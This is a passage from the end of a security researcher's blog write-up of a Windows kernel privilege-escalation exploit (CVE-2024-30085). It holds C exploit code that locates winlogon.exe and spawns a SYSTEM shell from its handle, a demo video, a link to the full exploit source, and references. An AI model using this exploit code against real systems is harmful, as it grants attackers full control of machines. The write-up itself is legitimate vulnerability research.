</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtAlpcSendWaitReceivePort</span>(ports[i], ALPC_MSGFLG_NONE, (PPORT_MESSAGE)alpcMessage, NULL, NULL, NULL, NULL, NULL);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>Once that is done, all we need to do is to find the PID of winlogon, obtain a handle to that process, and create a cmd.exe process using the handle to obtain an NT AUTHORITY\SYSTEM shell!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Find PID of winlogon
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PROCESSENTRY32 entry;
</span></span><span style="display:flex;"><span>    entry.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32);
</span></span><span style="display:flex;"><span>    HANDLE snapshot <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    HANDLE winlogon_process <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Process32First</span>(snapshot, <span style="color:#f92672">&amp;</span>entry) <span style="color:#f92672">==</span> TRUE) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">Process32Next</span>(snapshot, <span style="color:#f92672">&amp;</span>entry) <span style="color:#f92672">==</span> TRUE) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">wcscmp</span>(entry.szExeFile, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;winlogon.exe&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {  
</span></span><span style="display:flex;"><span>                winlogon_process <span style="color:#f92672">=</span> <span style="color:#a6e22e">OpenProcess</span>(PROCESS_CREATE_PROCESS, FALSE, entry.th32ProcessID);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Found winlogon: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, winlogon_process); 
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] SHELLZ</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CreateProcessFromHandle</span>(winlogon_process);
</span></span></code></pre></div><h4 id="exploit-demo">Exploit Demo</h4>
<p>This is how the exploit looks like when run:</p>
<iframe width="800" height="467" src="https://www.youtube.com/embed/MgPHAHwe7Bs?si=4v-v6J3TtjuAJ4Y7" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
<p>The exploit source code can be obtained <a href="https://github.com/star-sg/CVE/tree/master/CVE-2024-30085">here</a>.</p>
<h4 id="acknowledgements">Acknowledgements</h4>
<p>I would like to thank Chen Le Qi for his patience and guidance while I was working on this &ndash; I&rsquo;ve really learnt a lot!</p>
<h4 id="references">References</h4>
<ol>
<li>Windows Cloud Filter API documentation: <a href="https://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/">https://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/</a></li>
<li>Placeholder files: <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/placeholders">https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/placeholders</a></li>
<li>Reparse points: <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/reparse-points">https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/reparse-points</a></li>
<li>Windows structs: <a href="https://www.vergiliusproject.com/">https://www.vergiliusproject.com/</a></li>
<li>Cloud filter reparse data structs: <a href="https://github.com/ladislav-zezula/FileTest/blob/master/ReparseDataHsm.h">https://github.com/ladislav-zezula/FileTest/blob/master/ReparseDataHsm.h</a></li>
<li>ALPC technique by Xu, Song and Li: <a href="https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Xu-The-Next-Generation-of-Windows-Exploitation-Attacking-the-Common-Log-File-System.pdf">https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Xu-The-Next-Generation-of-Windows-Exploitation-Attacking-the-Common-Log-File-System.pdf</a></li>
<li>PipeAttribute technqiue by Bayet and Fariello: <a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf</a></li>
<li>Windows kernel heap by Angelboy: <a href="https://speakerdeck.com/scwuaptx/windows-kernel-heap-segment-heap-in-windows-kernel-part-1">https://speakerdeck.com/scwuaptx/windows-kernel-heap-segment-heap-in-windows-kernel-part-1</a></li>
<li>Exploitation of CVE-2023-36424 using ALPC and PipeAttributes, and for ALPC heap spray code: <a href="https://github.com/zerozenxlabs/CVE-2023-36424">https://github.com/zerozenxlabs/CVE-2023-36424</a></li>
<li>WNF heap spray: <a href="https://www.cnblogs.com/feizianquan/p/16089929.html">https://www.cnblogs.com/feizianquan/p/16089929.html</a></li>
<li>Spawning process from handle: <a href="https://github.com/varwara/CVE-2024-35250/blob/main/CVE-2024-35250.cpp">https://github.com/varwara/CVE-2024-35250/blob/main/CVE-2024-35250.cpp</a></li>
</ol>

    <h4><a href="https://kaligulaarmblessed.github.io/">Back to Home</a></h4>
</div>


        </div><footer class="container">
    <hr class="soften">
    <p>
&copy; 

    Kaligula Armblessed

<span id="thisyear">2025</span>


        | Built on <a href="//gohugo.io" target="_blank">Hugo</a>

</p>
    <p class="text-center">
        
        <a href="https://twitter.com/KaligulaSec">Twitter</a> 
        
        <a href="https://github.com/KaligulaArmblessed">GitHub</a> 
        
    </p>
</footer>

</body><link rel="stylesheet" href="/css/bootstrap.css">
<link rel="stylesheet" href="/css/bootstrap-responsive.css">
<link rel="stylesheet" href="/css/style.css">

<script src="/js/jquery.js"></script>
<script src="/js/bootstrap-386.js"></script>
<script src="/js/bootstrap-transition.js"></script>
<script src="/js/bootstrap-alert.js"></script>
<script src="/js/bootstrap-modal.js"></script>
<script src="/js/bootstrap-dropdown.js"></script>
<script src="/js/bootstrap-scrollspy.js"></script>
<script src="/js/bootstrap-tab.js"></script>
<script src="/js/bootstrap-tooltip.js"></script>
<script src="/js/bootstrap-popover.js"></script>
<script src="/js/bootstrap-button.js"></script>
<script src="/js/bootstrap-collapse.js"></script>
<script src="/js/bootstrap-carousel.js"></script>
<script src="/js/bootstrap-typeahead.js"></script>
<script src="/js/bootstrap-affix.js"></script>
<script>
    _386 = { 
        fastLoad: false ,
        onePass: true , 
        speedFactor: 1 
    };

    
    function ThisYear() {
        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
    };
</script></html>
